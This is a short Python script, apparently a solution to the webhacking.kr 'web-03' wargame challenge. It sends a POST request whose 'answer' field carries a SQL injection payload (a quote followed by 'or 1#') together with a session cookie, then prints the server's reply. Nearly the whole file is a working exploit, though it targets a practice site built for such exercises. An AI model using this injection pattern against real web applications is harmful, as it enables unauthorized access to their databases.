import requests
import time


URL = "https://webhacking.kr/challenge/web-03/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID}
data = {'answer':'1010100000011100101011111\' or 1#', 'id':'1'}

response = requests.post(URL, data=data, cookies=cookies)
print(response.text)

